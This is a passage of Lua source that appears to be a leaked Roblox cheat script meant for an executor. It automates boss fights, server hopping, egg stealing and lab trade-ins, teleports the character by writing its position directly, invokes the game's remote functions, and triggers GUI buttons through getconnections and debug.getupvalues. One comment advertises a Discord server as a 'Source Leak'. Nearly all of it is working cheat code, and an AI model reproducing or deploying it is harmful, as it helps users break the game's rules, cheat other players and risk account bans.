				writefile(mech.ChainPath, game:GetService("HttpService"):JSONEncode({ Until = mech.ChainUntil, Cycle = mech.ChainCycle, HopAt = mech.HopStamp }))
			end)
		end

		mech.StartChain = function()
			if not str1.Toggle(mech.HopHandle, false) or not mech.HopConfirmed then
				return
			end
			local serverTimeNow = workspace:GetServerTimeNow()
			local chainCycle = math.floor(serverTimeNow / mech.Interval)
			local flag328 = mech.ChainUntil > serverTimeNow
			local arrivedByHop

			if flag328 then
				arrivedByHop = flag328
			else
				arrivedByHop = mech.ChainCycle == chainCycle and mech.ArrivedByHop
			end

			if arrivedByHop then
				return
			end
			mech.ChainCycle = chainCycle
			mech.ChainUntil = math.min(serverTimeNow + mech.HopWindow * 60, mech.PortalCloses())
			mech.SaveChain()
		end

		pcall(function()
			if type(isfile) == "function" and isfile(mech.ChainPath) then
				local data = game:GetService("HttpService"):JSONDecode(readfile(mech.ChainPath))

				if type(data) == "table" then
					mech.ChainUntil = tonumber(data.Until) or 0
					mech.ChainCycle = tonumber(data.Cycle)
					mech.HopStamp = tonumber(data.HopAt) or 0
					mech.ArrivedByHop = workspace:GetServerTimeNow() - mech.HopStamp < 120
				end
			end
		end)

		obj37:CreateSlider({
			Name = "Keep Hopping For",
			Note = "Keeps fighting every boss it finds and hopping for this long",
			Min = 1,
			Max = 15,
			Default = 3,
			Increment = 1,
			Unit = "min",
			SubOf = mech.Handle,
			Callback = function(value)
				mech.HopWindow = math.clamp(math.floor(tonumber(value) or 3), 1, 15)
			end,
		})

		tbl2.Add(function()
			if not func240() or not str1.Toggle(mech.HopHandle, false) or not mech.HopConfirmed then
				mech.HopAt = nil
				mech.HopNote = nil
				return false
			end

			if mech.Hopping then
				return false
			end
			local serverTimeNow = workspace:GetServerTimeNow()

			if mech.ChainUntil > 0 and serverTimeNow >= mech.ChainUntil then
				mech.ChainUntil = 0
				mech.SaveChain()
			end

			if mech.ChainUntil <= serverTimeNow then
				local n5 = math.floor(serverTimeNow / mech.Interval)
				local n6 = serverTimeNow - n5 * mech.Interval
				local flag329 = (mech.ArmedCycle == n5 or mech.ChainCycle ~= n5) and n6 >= 20 and n6 < mech.OpenSeconds

				if flag329 then
					local loadedAt = mech.LoadedAt
					flag329 = os.clock() - loadedAt >= 8
				end

				if flag329 and not mech.Busy and not func243() and not func242() then
					pcall(mech.StartChain)
				end

				if mech.ArmedCycle ~= n5 then
					mech.ArmedCycle = nil
				end
			end

			if mech.ChainUntil <= serverTimeNow then
				local interval = mech.Interval
				local n5 = serverTimeNow - math.floor(serverTimeNow / mech.Interval) * interval
				mech.HopAt = nil

				if mech.OpenSeconds <= n5 then
					mech.HopNote = "Boss hop waits for the next portal"
				elseif mech.ArrivedByHop and mech.ChainCycle == math.floor(serverTimeNow / mech.Interval) then
					mech.HopNote = "Boss hop is done for this portal"
				elseif mech.Busy or func243() or func242() then
					mech.HopNote = "Boss hop starts after this boss"
				else
					mech.HopNote = "Looking for the boss here"
				end

				return false
			end

			local n5 = mech.ChainUntil - serverTimeNow

			if mech.Busy or func243() or func242() then
				mech.HopAt = nil
				mech.HopNote = "Boss hop on, " .. mech.Clock(n5) .. " left"
				return false
			end

			local loadedAt = mech.LoadedAt

			if os.clock() - loadedAt < 8 then
				mech.HopAt = nil
				mech.HopNote = "Looking for the boss here"
				return false
			end

			local steal = str1.Steal
			local flag330 = str1.Toggle(value2, false) == true and steal

			if flag330 then
				flag330 = steal.Wanted == true or steal.Carrying == true or steal.Active == true
			end

			if flag330 then
				mech.HopAt = nil
				mech.HopNote = "A filtered egg is here, stealing before the hop"
				return false
			end

			local value249 = mech
			local hopAt = mech.HopAt

			if not hopAt then
				local hopDelay = mech.HopDelay
				hopAt = os.clock() + hopDelay
			end

			value249.HopAt = hopAt
			local hopAt2 = mech.HopAt
			if os.clock() < hopAt2 then
				mech.HopNote = string.format("No boss here, hopping in %ds  |  %s left", math.ceil(mech.HopAt - os.clock()), mech.Clock(n5))
				return false
			end

			if type(str1.ServerHop) ~= "function" then
				mech.HopNote = "Server hop is not ready"
				return false
			end
			mech.Hopping = true
			mech.HopNote = "Joining a less crowded server"
			mech.HopStamp = workspace:GetServerTimeNow()
			mech.SaveChain()

			task.spawn(function()
				local ok2, result2 = pcall(str1.ServerHop, "Least Players")
				ok2 = ok2 and tostring(result2) or "error"
				mech.Hopping = false

				if ok2 == "waiting" then
					mech.HopAt = os.clock() + 15
					mech.HopNote = "Teleporting to the next server"
				elseif ok2 == "fetch" then
					mech.HopAt = os.clock() + 10
					mech.HopNote = "Server list unavailable, trying again soon"
				else
					mech.HopAt = os.clock() + 3
					mech.HopNote = "Hop did not land, trying again"
				end
			end)

			return false
		end)

		tbl2.Add(function()
			local row = mech.Row

			if not func240() then
				mech.Status = "Off  |  " .. mech.Timer()
			elseif not mech.Busy then
				if func243() then
					mech.Status = "In the arena"
				else
					mech.Status = mech.Timer()
				end

				if mech.HopNote then
					mech.Status = mech.Status .. "  |  " .. mech.HopNote
				end
			end

			if row and mech.Shown ~= mech.Status and type(row.Set) == "function" then
				mech.Shown = mech.Status
				pcall(row.Set, row, mech.Status)
			end

			local invisibilityHandle = str1.InvisibilityHandle
			local flag331 = invisibilityHandle ~= nil and str1.Toggle(invisibilityHandle, false)

			if func240() and (mech.Busy or func243() or func242()) then
				mech.InvisResumeAt = nil

				if not str1.InvisMech then
					str1.InvisMech = true

					if flag331 then
						str1.Notify("Invisibility", "Invisibility is paused for the Mech boss and comes back after it.")
					end
				end
			elseif str1.InvisMech and not mech.Busy then
				mech.InvisResumeAt = mech.InvisResumeAt or os.clock() + 5
				-- https://discord.gg/x7YbZeezpm | 𝗦𝗼𝘂𝗿𝗰𝗲 𝗟𝗲𝗮𝗸

				if mech.InvisResumeAt <= os.clock() then
					mech.InvisResumeAt = nil
					str1.InvisMech = false

					if flag331 then
						str1.Notify("Invisibility", "The Mech boss is over, Invisibility is back on.")
					end
				end
			end

			if not func240() or mech.Busy then
				return true
			end

			if mech.CycleDone() and (func243() or func242()) then
				if func243() then
					mech.Status = "Boss defeated, leaving the arena"

					if not mech.Leaving then
						mech.Leaving = true

						task.spawn(function()
							pcall(str1.MechLeave)
							mech.Leaving = false
						end)
					end
				else
					mech.Status = "Boss defeated  |  " .. mech.Timer()
				end

				return true
			end

			if func243() or func242() then
				local str26 = mech.StealFirst()

				if str26 then
					mech.Status = str26 .. "  |  " .. mech.Timer()

					if func243() and not mech.Leaving then
						mech.Leaving = true

						task.spawn(function()
							pcall(str1.MechLeave)
							mech.Leaving = false
						end)
					end

					return true
				end

				local character = localPlayer.Character
				if character and character:GetAttribute("InvisApplied") == true then
					mech.Status = "Leaving Invisibility for the boss"
					return true
				end

				if not str1.ClaimMovement("mech") then
					mech.Status = "Waiting for " .. tostring(str1.Movement.Owner or "movement")
					return true
				end
				task.spawn(func256)
				return true
			end

			return true
		end)

		func4(function()
			str1.InvisMech = false
			mech.Generation = mech.Generation + 1

			for _, link in ipairs(mech.Links) do
				pcall(function()
					link:Disconnect()
				end)
			end

			pcall(str1.Shield, "mech", false)
			pcall(str1.ReleaseMovement, "mech")
		end)
	end

	str1.MechBoot(obj3)

	do
		local n5 = 1
		local n6 = 1
		local value250 = nil
		local value251 = nil
		local flag332 = false
		local n7 = 0
		local n8 = 0
		local n9 = 0
		local value252 = nil
		local n10 = 0
		local str27 = ""
		local flag333 = false

		local function func257(childName9, flag334)
			local obj40 = networking:FindFirstChild(childName9)
			if not obj40 or not obj40:IsA("RemoteFunction") then
				return false, nil, nil
			end

			if flag334 == nil then
				return pcall(obj40.InvokeServer, obj40)
			end
			return pcall(obj40.InvokeServer, obj40, flag334)
		end

		local function func258()
			local save2 = tbl1.Save
			if type(save2) ~= "table" or type(save2.Get) ~= "function" then
				return nil
			end
			local ok, result = pcall(save2.Get)
			return ok and type(result) == "table" and result or nil
		end

		local function func259(param172)
			local directory = tbl1.Assets and tbl1.Assets.Directory
			local flag335 = type(directory) == "table" and directory[tostring(param172)] or nil
			return tostring(type(flag335) == "table" and flag335.DisplayName or param172)
		end

		local function func260(flag336)
			if not flag336 and type(value252) == "table" and os.clock() < n9 then
				return value252
			end
			n9 = os.clock() + n6
			local AskState, value253 = func257("RF/ScrambleTradeIn/AskState")

			if AskState and type(value253) == "table" then
				value252 = value253
				n10 = os.clock()
			end

			return value252
		end

		local function func261()
			local tbl200 = {}
			local eggState = tbl1.EggState

			if type(eggState) == "table" and type(eggState.ReadOwnerEggs) == "function" then
				local ok, result = pcall(eggState.ReadOwnerEggs, localPlayer.UserId)

				if ok and type(result) == "table" then
					for k, value254 in pairs(result) do
						if type(value254) == "table" and value254.Placement ~= nil then
							tbl200[k] = true
						end
					end
				end
			end

			return tbl200
		end

		local function func262(param173, param174)
			local requirements = type(param173) == "table" and param173.Requirements or nil
			if type(requirements) ~= "table" or #requirements == 0 then
				return nil, "No active recipe", {}
			end
			local result47 = func261()
			local tbl201 = {}
			local tbl202 = {}

			for _, requirement in ipairs(requirements) do
				tbl201[tostring(requirement)] = {}
			end

			local func263 = pairs
			local eggInventory = param174.EggInventory or {}

			for k, value255 in func263(eggInventory) do
				local flag337 = type(value255) == "table" and tostring(value255.AssetCategory) or nil
				local value256 = flag337 and tbl201[flag337] or nil

				if value256 then
					if result47[k] then
						tbl202[flag337] = true
					else
						local baseMutation2 = value255.BaseMutation ~= nil and value255.BaseMutation ~= "Normal" or type(value255.Mutations) == "table" and next(value255.Mutations) ~= nil
						table.insert(value256, { Uid = k, Scale = tonumber(value255.AssetScale) or 0, Mutated = baseMutation2 })
					end
				end
			end

			for _, value257 in pairs(tbl201) do
				table.sort(value257, function(param175, param176)
					if param175.Mutated ~= param176.Mutated then
						return param176.Mutated
					end
					return param175.Scale < param176.Scale
				end)
			end

			local tbl203 = {}
			local tbl204 = {}
			local tbl205 = {}
			local value258 = nil

			for i, requirement in ipairs(requirements) do
				local entry13 = tbl201[tostring(requirement)]
				local func264 = ipairs
				entry13 = entry13 or {}
				local value259 = nil

				for _, value260 in func264(entry13) do
					if not tbl204[value260.Uid] then
						value259 = value260
						break
					else
						value259 = nil
					end
				end

				if value259 then
					tbl204[value259.Uid] = true
					tbl205[i] = value259.Uid
					table.insert(tbl203, value259.Uid)
				elseif not value258 then
					if tbl202[tostring(requirement)] then
						value258 = "Need a " .. func259(requirement) .. " egg, yours is placed on a nest"
					else
						value258 = "Need a " .. func259(requirement) .. " egg"
					end
				end
			end

			if value258 then
				return nil, value258, tbl204, tbl205
			end
			return tbl203, nil, tbl204, tbl205
		end

		local tbl206 = {}

		local function func265()
			local playerGui = localPlayer:FindFirstChildOfClass("PlayerGui")
			playerGui = playerGui and playerGui:FindFirstChild("DrScrambleTradeIn")
			local drScrambleTradeInMain = playerGui and playerGui:FindFirstChild("DrScrambleTradeInMain")
			playerGui = playerGui and playerGui:FindFirstChild("DrScrambleTradeInInventory", true)
			local sacrificeInputs = drScrambleTradeInMain and drScrambleTradeInMain:FindFirstChild("SacrificeInputs")
			if not drScrambleTradeInMain or not playerGui or not sacrificeInputs then
				return nil
			end
			return { Main = drScrambleTradeInMain, Inventory = playerGui, Inputs = sacrificeInputs }
		end

		local function func266(instance11)
			if typeof(instance11) ~= "Instance" or not instance11:IsA("GuiButton") then
				return false
			end
			local ok, result = pcall(getconnections, instance11.Activated)
			if not ok or type(result) ~= "table" or #result == 0 then
				return false
			end
			local flag338 = false

			for _, item86 in ipairs(result) do
				local ok2, result2 = pcall(function()
					return item86.Function
				end)

				local flag339 = ok2 and type(result2) == "function"
				local value261 = nil

				if flag339 then
					local ok3, result3 = pcall(debug.getupvalues, result2)
					ok3 = ok3 and type(result3) == "table"
					value261 = nil

					if ok3 then
						value261 = nil

						for i = 1, #result3 do
							if type(result3[i]) == "function" then
								value261 = result3[i]
								break
							else
								value261 = nil
							end
						end
					end
				end

				if value261 then
					flag338 = pcall(value261) or flag338
				else
					flag338 = pcall(function()
						item86:Fire()
					end) or flag338
				end
			end

			return flag338
		end

		local function func267(instance12)
			local full = instance12 and instance12:FindFirstChild("Full")
			return full ~= nil and full.Visible == true
		end

		local function func268(param177, flag340)
			for i = 1, flag340 do
				if not func267(param177.Inputs:FindFirstChild("Input" .. i)) then
					return false
				end
			end

			return flag340 > 0
		end

		local function func269(param178, tbl207)
			local result48 = func265()
			local requirements = type(param178) == "table" and param178.Requirements or nil
			if not result48 or type(requirements) ~= "table" then
				return false
			end

			for i = 1, #requirements do
				local obj41 = result48.Inputs:FindFirstChild("Input" .. i)
				local entry14 = tbl207[i]
				local flag341 = obj41 and entry14 and not func267(obj41)

				if flag341 then
					flag341 = (tbl206[entry14] or 0) <= os.clock()
				end

				if flag341 then
					local empty = obj41:FindFirstChild("Empty")

					if func266(empty and empty:FindFirstChild("Add")) then
						local scrollingFrame = result48.Inventory:FindFirstChild("ScrollingFrame")
						local n11 = 0
						local value262 = nil

						while n11 < 2 do
							value262 = scrollingFrame and scrollingFrame:FindFirstChild("Egg_" .. entry14)
							if not value262 then
								n11 += task.wait(0.1)
								continue
							end
							break
						end

						if value262 then
							func266(value262)
						end

						local n12 = 0

						while n12 < 2 and not func267(obj41) do
							n12 += task.wait(0.1)
						end

						if result48.Inventory.Visible then
							if not func266(result48.Inventory:FindFirstChild("Close")) then
								result48.Inventory.Visible = false
							end
						end
					end

					if not func267(obj41) then
						tbl206[entry14] = os.clock() + 30
					end
				end
			end

			return func268(result48, #requirements)
		end

		local function func270()
			local value263 = value252
			if type(value263) ~= "table" then
				return "Lab status unknown"
			end

			if value263.Unlocked ~= true then
				return "Lab is locked on this account"
			end
			local tbl208 = {}
			local func271 = ipairs
			local requirements = value263.Requirements or {}

			for _, requirement in func271(requirements) do
				table.insert(tbl208, func259(requirement))
			end

			local n11 = (tonumber(value263.SecondsUntilRotation) or 0) - os.clock() - n10

			if n11 < 0 then
				n11 = 0
			end

			local formatted11 = string.format("%s  -  needs %s  -  pity %s/%s  -  free rerolls %s  -  rotates in %d:%02d", tostring(value263.BannerDisplayName or value263.BannerId or "Lab"), #tbl208 > 0 and table.concat(tbl208, ", ") or "unknown", tostring(value263.PityCount or 0), tostring(value263.PityThreshold or 0), tostring(value263.FreeRefreshesRemaining or 0), math.floor(n11 / 60), math.floor(n11 % 60))

			if str27 ~= "" then
				formatted11 ..= "  -  " .. str27
			end

			return formatted11
		end

		local function func272(flag342)
			local value264 = func260(true)
			if type(value264) ~= "table" or value264.Unlocked ~= true then
				return
			end

			if value264.PendingReward ~= nil and value264.PendingReward ~= false then
				local AskFinishReveal, flag343 = func257("RF/ScrambleTradeIn/AskFinishReveal")
				str27 = AskFinishReveal and flag343 ~= false and "Reward claimed" or "Reward claim failed"
				n9 = 0
				return
			end

			if not str1.Lab.BannerOk(value264.BannerId) then
				str1.Lab.Reserved = {}
				str27 = "Waiting for " .. str1.Lab.PickedText()
				return
			end

			local result49 = func258()
			if not result49 then
				return
			end
			local flag344, flag345, flag346, flag347 = func262(value264, result49)
			local flag348 = str1.Toggle(value250, false)
			str1.Lab.Reserved = flag348 and flag346 or {}
			flag348 = flag348 and flag342 == n7
			local flag349 = false

			if flag348 then
				local result
				flag349, result = pcall(func269, value264, flag347 or {})
				flag349 = flag349 and result == true
			end

			if not flag344 then
				str27 = flag345 or "Recipe not ready"
				local flag350 = flag342 == n7 and str1.Toggle(value251, false)

				if flag350 then
					flag350 = (tonumber(value264.FreeRefreshesRemaining) or 0) > 0
				end

				if flag350 then
					local AskRefresh, flag351, flag352 = func257("RF/ScrambleTradeIn/AskRefresh")

					if AskRefresh and flag351 ~= false then
						str27 = "Recipe rerolled"
					else
						str27 = tostring(flag352 or "Reroll rejected")
					end

					n9 = 0
				end

				return
			end

			if not str1.Toggle(value250, false) then
				str27 = "Ready to trade in"
				return
			end

			if flag342 ~= n7 then
				return
			end

			if flag349 then
				local result50 = func265()

				if result50 and func266(result50.Main:FindFirstChild("Sacrifice", true)) then
					str27 = "Trade-in sent"
					n9 = 0
					return
				end
			end

			local AskTradeIn, flag353, flag354 = func257("RF/ScrambleTradeIn/AskTradeIn", flag344)

			if AskTradeIn and flag353 ~= false then
				str27 = "Trade-in sent"
			else
				str27 = tostring(flag354 or "Trade rejected")
			end

			n9 = 0
		end

		local flag355 = obj3:CreateText({ Name = "Lab Status", Text = "Loading Lab data..." })
		local tbl209 = {}
		local byName3 = {}

		for _, item87 in ipairs(str1.Lab.BannerList()) do
			table.insert(tbl209, item87.Name)
			byName3[item87.Name] = item87.Id
		end

		func6(obj3:CreateMultiDropdown({
			Name = "Lab Banners",
			Note = "Only trade and steal for these banners (empty = all)",
			Options = tbl209,
			Default = {},
			Callback = function(value)
				local banners = {}

				if type(value) == "table" then
					for k, value265 in pairs(value) do
						k = value265 == true and type(k) == "string" and k or type(value265) == "string" and value265 or nil

						if k and byName3[k] then
							banners[byName3[k]] = true
						end
					end
				end

				str1.Lab.Banners = banners
				str27 = ""
				n8 = 0
				n9 = 0
				str1.Rift.Next = 0

				if type(str1.Lab.ForceSteal) == "function" then
					pcall(str1.Lab.ForceSteal)
				end

				tbl2.Wake()
			end,
		}))

		value250 = obj3:CreateToggle({
			Name = "Auto Lab Trade-In",
			Default = false,
			Callback = function()
				if not str1.Toggle(value250, false) then
					str1.Lab.Reserved = {}
				end

				n7 += 1
				str27 = ""
				n8 = 0
				n9 = 0
				tbl2.Wake()
			end,
		})

		value251 = obj3:CreateToggle({
			Name = "Auto Reroll Lab Recipe",
			Default = false,
			Callback = function()
				n7 += 1
				str27 = ""
				n8 = 0
				n9 = 0
				tbl2.Wake()
			end,
		})

		str1.Lab.PlaceHandle = obj3:CreateToggle({
			Name = "Auto Place Lab Reward Eggs",
			Note = "Places the reward eggs from Lab trades",
			Default = false,
			Callback = function(value)
				if type(value) ~= "boolean" then
					value = str1.Toggle(str1.Lab.PlaceHandle, false)
				end

				str1.Lab.PlaceOn = value == true

				if type(str1.PlaceEggRefresh) == "function" then
					pcall(str1.PlaceEggRefresh)
				end

				tbl2.Wake()
			end,
		})

		tbl2.Add(function()
			local flag356 = str1.Toggle(value250, false)
			local value266 = str1.Toggle(value251, false)
			local n11 = (flag356 or value266) and 1 or 30

			if not flag333 and (value252 == nil or n9 == 0 or os.clock() - n10 >= n11) then
				flag333 = true

				task.spawn(function()
					pcall(func260, true)
					flag333 = false
				end)
			end

			if flag355 and type(flag355.Set) == "function" then
				pcall(flag355.Set, flag355, func270())
			end

			local value267 = flag332
			local flag357

			if flag332 then
				flag357 = value267
			else
				flag357 = not (flag356 or value266)
			end

			if flag357 or os.clock() < n8 then
				return false
			end
			flag332 = true
			n8 = os.clock() + n5
			local value268 = n7

			task.spawn(function()
				pcall(func272, value268)
				flag332 = false
				tbl2.Wake()
			end)

			return false
		end)
	end

	local n5
	n5 = 6
	local n6
	n6 = 1.5
	local n7
	n7 = 400
	local list37, tbl210, list38, tbl211, tbl212, tbl213, snapshot, n8, flag358, n9
	local n10, str28, str29, flag359, n11, flag360, list39, flag361, flag362, n12
	local value269, scrambleRequest, scrambleRead, func273, func274, func275, func276, func277, func278, func279
	local func280, func281, func282, func283, func284

	do
		local vector = Vector3.new(2120, -120, -355)
		list37 = { "LostPart1", "LostPart2" }

		tbl210 = {
			{ Label = "Scrambled Mutation", Id = "MutationConsumable" },
			{ Label = "2x Cash Booster", Id = "CashBooster" },
			{ Label = "1.25x Speed", Id = "SpeedBoost" },
			{ Label = "2x Treadmill Booster", Id = "TreadmillBooster" },
		}

		list38 = {}

		for _, item88 in ipairs(tbl210) do
			list38[#list38 + 1] = item88.Label
		end

		tbl211 = {}
		tbl212 = {}
		tbl213 = { Keep = 0, Handle = nil, Picked = { ["Scrambled Mutation"] = true } }
		snapshot = nil
		n8 = -math.huge
		flag358 = false
		n9 = 0
		n10 = 0
		str28 = ""
		str29 = ""
		flag359 = { Tool = nil, EquipAt = 0 }
		n11 = 16
		flag360 = false
		list39 = { Index = 1, Since = 0, Tool = nil }
		flag361 = { Latch = false, Ended = false }
		flag362 = false
		n12 = 0
		value269 = nil

		local function func285()
			local packages = ReplicatedStorage:FindFirstChild("Packages")
			packages = packages and packages:FindFirstChild("Networking")
			packages = packages and packages:FindFirstChild("RF/Scramble/Request")
			if packages and packages:IsA("RemoteFunction") then
				return packages
			end
			return nil
		end

		scrambleRequest = function(payload, ...)
			local result51 = func285()
			if not result51 then
				return nil
			end
			local packed1 = table.pack(...)

			local ok, result = pcall(function()
				return result51:InvokeServer(payload, table.unpack(packed1, 1, packed1.n))
			end)

			if not ok or type(result) ~= "table" then
				return nil
			end

			if type(result.Snapshot) == "table" then
				snapshot = result.Snapshot
				n8 = os.clock()
			elseif payload == "Snapshot" and type(result.State) == "table" then
				snapshot = result
				n8 = os.clock()
			end

			return result
		end

		scrambleRead = function(flag363)
			if flag363 or snapshot == nil or os.clock() - n8 >= n5 then
				scrambleRequest("Snapshot")
			end

			return snapshot
		end

		str1.ScrambleRead = scrambleRead
		str1.ScrambleRequest = scrambleRequest

		str1.ScrambleSnapshot = function()
			return snapshot
		end

		func273 = function()
			local value270 = snapshot
			return type(value270) == "table" and type(value270.State) == "table" and value270.State or nil
		end

		func274 = function()
			local value271 = snapshot
			if type(value271) ~= "table" or value271.Enabled == false or type(value271.State) ~= "table" then
				return false
			end
			local eventEndsAt = tonumber(value271.EventEndsAt)
			return eventEndsAt == nil or workspace:GetServerTimeNow() < eventEndsAt
		end

		func275 = function()
			local value272 = snapshot
			local window = type(value272) == "table" and value272.Window or nil
			if type(window) ~= "table" then
				return false, nil
			end
			local serverTimeNow = workspace:GetServerTimeNow()
			local startsAt = tonumber(window.StartsAt)
			local endsAt = tonumber(window.EndsAt)
			local active2 = window.Active == true
			local flag364

			if active2 then
				flag364 = active2
			else
				flag364 = startsAt and endsAt and serverTimeNow >= startsAt and serverTimeNow < endsAt
			end

			if flag364 then
				return true, endsAt and math.max(0, endsAt - serverTimeNow) or nil
			end
			local nextAt = tonumber(window.NextAt)
			return false, nextAt and math.max(0, nextAt - serverTimeNow) or nil
		end

		func276 = function(param179, param180)
			local lostParts = type(param179) == "table" and param179.LostParts or nil
			if type(lostParts) ~= "table" then
				return false
			end

			if lostParts[param180] then
				return true
			end

			for _, lostPart in pairs(lostParts) do
				if lostPart == param180 then
					return true
				end
			end

			return false
		end

		func277 = function(param181)
			local n13 = 0

			for _, item89 in ipairs(list37) do
				if func276(param181, item89) then
					n13 += 1
				end
			end

			return n13
		end

		local function func286(param182)
			local n13 = math.max(0, math.floor(tonumber(param182) or 0))
			if n13 >= 3600 then
				return string.format("%dh %dm", n13 // 3600, n13 % 3600 // 60)
			end
			return string.format("%dm %ds", n13 // 60, n13 % 60)
		end

		func278 = function()
			local result52 = func273()
			if not result52 then
				return "Dr Scramble event is not running"
			end

			if not func274() then
				return "Dr Scramble event has ended"
			end
			local value273, flag365 = func275()
			local flag366

			if value273 then
				flag366 = "Outbreak live " .. func286(flag365 or 0)
			else
				flag366 = value273
			end

			flag366 = flag366 or flag365 and "Outbreak in " .. func286(flag365) or "Outbreak soon"
			local completed = result52.Completed == true and "Vault claimed"

			if not completed then
				completed = string.format("Lost %d/2  Drone %d/3", func277(result52), math.min(3, tonumber(result52.DroneParts) or 0))
			end

			if value273 then
				local n13 = 0

				for _, value274 in pairs(tbl211) do
					if (tonumber(value274.Health) or 0) > 0 then
						n13 += 1
					end
				end

				flag366 ..= string.format("  %d drones", n13)
			end

			local formatted12 = string.format("Samples %d  -  %s  -  %s", tonumber(result52.Samples) or 0, completed, flag366)

			if str29 ~= "" and str1.Toggle(nil, false) then
				formatted12 ..= "  -  " .. str29
			end

			if str28 ~= "" then
				formatted12 ..= "  -  " .. str28
			end

			return formatted12
		end

		func279 = function()
			return str1.Root()
		end

		func280 = function(num89, callback11, flag367, flag368)
			local n13 = flag368 or 400
			local result53 = func279()
			if not result53 then
				return false
			end
			flag367 = flag367 or 1
			if (result53.Position - num89).Magnitude <= flag367 then
				return true
			end
			str1.Shield("scramble", true)
			local n14 = os.clock() + 6

			while not str1.Swapped() and os.clock() < n14 and not callback11() do
				str28 = "Waiting for the character to settle"
				RunService.Heartbeat:Wait()
			end

			local value275 = func279() or result53
			local character = localPlayer.Character
			str1.Driving = str1.Driving + 1
			local position = value275.Position
			local value276 = nil
			local n15 = (num89 - position).Magnitude / n13 + 3
			local n16 = 0

			local connection = RunService.Heartbeat:Connect(function(deltaTime)
				if value276 ~= nil or str1.AntiGuard.Busy then
					return
				end
				n16 += deltaTime
				local result54 = func279()
				if not result54 or callback11() or n16 > n15 or localPlayer.Character ~= character then
					value276 = false
					return
				end

				if (result54.Position - position).Magnitude > 8 then
					position = result54.Position
				end

				local n17 = num89 - position
				local n18 = n13 * deltaTime
				local flag369 = n17.Magnitude <= math.max(n18, flag367)
				position = flag369 and num89 or position + n17.Unit * n18
				local vector2 = Vector3.new(n17.X, 0, n17.Z)
				local cframe = vector2.Magnitude > 0.05 and CFrame.lookAt(Vector3.zero, vector2.Unit) or result54.CFrame.Rotation

				pcall(function()
					result54.CFrame = CFrame.new(position) * cframe
					result54.AssemblyLinearVelocity = Vector3.zero
					result54.AssemblyAngularVelocity = Vector3.zero
				end)

				if flag369 then
					value276 = true
				end
			end)

			while value276 == nil do
				RunService.Heartbeat:Wait()
			end

			connection:Disconnect()
			str1.Driving = math.max(0, str1.Driving - 1)
			str1.Shield("scramble", false)
			return value276
		end

		func281 = function(instance13)
			if typeof(instance13) ~= "Instance" or not instance13:IsA("ProximityPrompt") then
				return false
			end

			local ok = pcall(function()
				instance13:InputHoldBegin()
				local n13 = tonumber(type(str1.PromptHold) == "function" and str1.PromptHold(instance13) or instance13.HoldDuration) or 0

				if n13 > 0 then
					task.wait(n13 + 0.2)
				end

				instance13:InputHoldEnd()
			end)

			if not ok and type(fireproximityprompt) == "function" then
				ok = pcall(fireproximityprompt, instance13)
			end

			return ok
		end

		local function func287()
			local world = workspace:FindFirstChild("World") or workspace:FindFirstChild("__OBJECTS")
			world = world and world:FindFirstChild("SecretZones")
			return world and world:FindFirstChild("Cave") or nil
		end

		func282 = function(childName10)
			local teleporter = func287()
			teleporter = teleporter and teleporter:FindFirstChild("Teleporter")
			teleporter = teleporter and teleporter:FindFirstChild(childName10)
			teleporter = teleporter and teleporter:FindFirstChild("SecretZonePrompt", true)
			return teleporter and teleporter:IsA("ProximityPrompt") and teleporter or nil
		end

		func283 = function(part15, param183)
			part15 = part15 and part15.Parent
			if part15 and part15:IsA("Attachment") then
				return part15.WorldPosition
			end

			if part15 and part15:IsA("BasePart") then
				return part15.Position
			end
			return param183
		end

		func284 = function()
			local result55 = func279()
			if not result55 then
				return false
			end
			local position = result55.Position
			local vector2 = Vector3.new(position.X - vector.X, 0, position.Z - vector.Z)
			return position.Y < -60 and vector2.Magnitude < 160
		end
	end

	local func288

	local function func289()
		local world = workspace:FindFirstChild("World") or workspace:FindFirstChild("__OBJECTS")
		local areas = world and world:FindFirstChild("Areas")
		areas = areas and areas:FindFirstChild("SeparationLine")
		return areas and areas:IsA("BasePart") and areas.Position.X or 552
	end

	func288 = function(part16)
		if not part16 then
			part16 = func279()
			part16 = part16 and part16.Position
		end

		return part16 ~= nil and part16.X < func289()
	end

	local connection = localPlayer.CharacterAdded:Connect(function()
		str1.ScrambleRespawned = true
		flag359.Tool = nil
		flag359.EquipAt = 0
	end)

	func4(function()
		pcall(function()
			connection:Disconnect()
		end)
	end)

	local func290

	func290 = function(callback12, flag370)
		if not func288() then
			str1.ScrambleRespawned = false
			return true
		end

		if flag370 and func288(flag370) then
			return true
		end

		local function func291()
			str28 = "Respawned, resting in the safe zone"
			local n13 = os.clock() + 0.75

			while os.clock() < n13 do
				if callback12() then
					return false
				end
				task.wait(0.1)
			end

			str1.ScrambleRespawned = false
			return true
		end

		local stealHome3 = type(str1.StealHome) == "function" and str1.StealHome() or nil
		if not stealHome3 then
			str1.ScrambleRespawned = false
			return true
		end
		local scrambleRespawned = str1.ScrambleRespawned == true

		if str1.DistanceTo(stealHome3) <= 12 then
			if scrambleRespawned then
				return (func291())
			end
			return true
		end

		str28 = scrambleRespawned and "Respawned, easing out through the safe zone" or "Leaving the base through the safe zone"
		local func292 = func280
		local num90 = func292(stealHome3 + Vector3.new(0, 3, 0), callback12, 3, scrambleRespawned and math.min(400, 300) or nil)
		if num90 and scrambleRespawned then
			return (func291())
		end
		return num90
	end

	local func293, func294

	do
		local function func295(param184, param185, param186)
			local result56 = func279()
			if not result56 then
				return false
			end
			str1.Shield("scramblefly", true)
			local position = result56.Position
			local flag371 = true

			if Vector3.new(param184.X - position.X, 0, param184.Z - position.Z).Magnitude > 250 then
				local n13 = math.max(position.Y, param184.Y, 98)
				flag371 = func280(Vector3.new(position.X, n13, position.Z), param185, 2) and func280(Vector3.new(param184.X, n13, param184.Z), param185, 2)
			end

			flag371 = flag371 and func280(param184, param185, math.min(param186, 2))
			str1.Shield("scramblefly", false)
			return flag371
		end

		local function func296()
			local stealHome4 = type(str1.StealHome) == "function" and str1.StealHome() or nil
			return stealHome4 and stealHome4 + Vector3.new(0, 3, 0) or nil
		end

		func293 = function(num91, param187, flag372)
			local n13 = flag372 or 6
			if str1.DistanceTo(num91) <= n13 then
				return true
			end
			local result57 = func288()
			local flag373 = func288(num91)

			if result57 and not flag373 then
				if not func290(param187, num91) then
					return false
				end
			elseif flag373 and not result57 then
				local result58 = func296()

				if result58 and (result58 - num91).Magnitude > 12 and str1.DistanceTo(result58) > 12 then
					str28 = "Coming back through the safe zone"
					if not func295(result58, param187, 3) then
						return false
					end
				end
			end

			return func295(num91, param187, n13)
		end

		func294 = function(callback13)
			if func288() or callback13() or str1.IsNight() or str1.WallSealed() then
				return
			end
			local result59 = func296()

			if result59 then
